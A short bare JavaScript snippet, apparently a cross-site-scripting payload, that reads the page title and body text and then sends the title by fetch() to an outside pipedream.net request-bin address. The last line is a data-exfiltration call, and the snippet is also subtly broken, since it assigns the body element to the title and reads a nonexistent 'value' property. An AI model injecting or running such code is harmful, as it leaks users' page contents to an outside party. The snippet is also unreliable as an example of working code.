console.log(document.title);
console.log(document.body.innerText);
window.document.title = window.document.body;
console.log(document.title.value);
fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + window.document.title);